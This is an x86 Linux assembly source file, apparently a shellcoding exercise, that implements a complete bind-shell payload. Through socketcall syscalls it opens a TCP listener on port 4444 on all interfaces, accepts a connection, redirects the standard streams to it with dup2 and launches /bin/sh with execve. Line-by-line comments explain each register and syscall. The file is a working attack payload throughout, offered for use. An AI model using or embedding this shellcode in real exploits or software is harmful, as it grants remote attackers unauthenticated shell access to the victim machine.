
global _start

section .text

_start:

	;syscall for socket 
	;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
	;#define __NR_socketcall		102 (0x66 in hex)
	;sock_file_des = socket(AF_INET, SOCK_STREAM, 0)
	;AF_INET = 2  ( bits/socket.h)
	;SOCK_STREAM = 1 (bits/socket.h)
	;socket(2,1,0)
	xor eax, eax	; zero out eax register using XOR operation
	xor ebx, ebx	; zero out ebx register using XOR operation
	
	push eax  		; move 0 to stack (protocol=0)
	mov al, 0x66	; moves socket call number to al register
	mov bl, 0x1		; moves 0x1 to bl register
	push ebx		; value in ebx=1 is pushed in to the stack (sock_stream =1)
	push 0x2	; value 0x2 is pushed onto stack (AF_INET=2)
	mov ecx, esp	; save the pointer to args in ecx
	int 0x80		; socket()
	mov esi, eax	; store sockfd in esi register

	;sock_ad.sin_addr.s_addr = INADDR_ANY;//0, bindshell will listen on any address
	;sock_ad.sin_port = htons(4444);// port to bind.(4444)
	;sock_ad.sin_family = AF_INET; // TCP protocol (2).
	
	xor edx, edx	; zero out edx register using XOR operation
	push edx		; push 0 on to stack (INADDR_ANY)
	push word 0x5C11; htons(4444)  (4444 = 0x115c)
	push word 0x2	; AF_INET = 2
	mov ecx, esp	; save the pointer to args in ecx

	;bind(sock_file_des, (struct sockaddr *) &sock_ad, sizeof(sock_ad));
	;cat /usr/include/linux/net.h | grep bind
	;bind = 2

	mov al, 0x66	; sys socket call
	mov bl, 0x2		; bind =2
	push 0x10		; size of sock_ad (sizeof(sock_ad))
	push ecx		; struct pointer
	push esi		; push sockfd (sock_file_des) onto stack
	mov ecx, esp	; save the pointer to args in ecx
	int 0x80


	;listen(sock_file_des, 0);
	;cat /usr/include/linux/net.h | grep listen
	; listen =4

	mov al, 0x66	; sys socket call
	mov bl, 0x4		; listen=4
	push edx		; push 0 onto stack (backlog=0)
	push esi		; sockfd (sock_file_des )	
	mov ecx, esp	; save the pointer to args in ecx
	int 0x80

	;clientfd = accept(sock_file_des, NULL, NULL)
	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	;cat /usr/include/linux/net.h | grep accept
	; accept=5

	mov al, 0x66		; sys socket call
	mov bl, 0x5         ; accept =5
	push edx		; null value socklen_t *addrlen
	push edx		; null value sockaddr *addr
	push esi		; sockfd (sock_file_des )
	mov ecx, esp	; save the pointer to args in ecx
	int 0x80

	;int dup2(int oldfd, int newfd);
	;dup2(clientfd, 0); //	stdin
	;dup2(clientfd, 1); //	stdout
	;dup2(clientfd, 2); //	stderr

	mov ebx, eax	;move client fd to ebx
	xor ecx, ecx	; xor to clear out ecx
	mov cl, 3		; counter to loop 3 times

loopinghere:

	mov al, 0x3f	; sys call for dup2
	int 0x80
	dec cl			; decrement till 0
	jns loopinghere ; loop as long sign flag is not set

	;Execute shell (here we use /bin/sh) using execve call
	;execve("//bin/sh",["//bin/sh"])

	
	mov   al, 11            ; execve
    push  edx               ; push null
    push  0x68732f6e        ; hs/b
    push  0x69622f2f        ; ib//
    mov   ebx,esp           ; save pointer
    push  edx               ; push null
    push  ebx               ; push pointer
    mov   ecx,esp           ; save pointer
    int   0x80
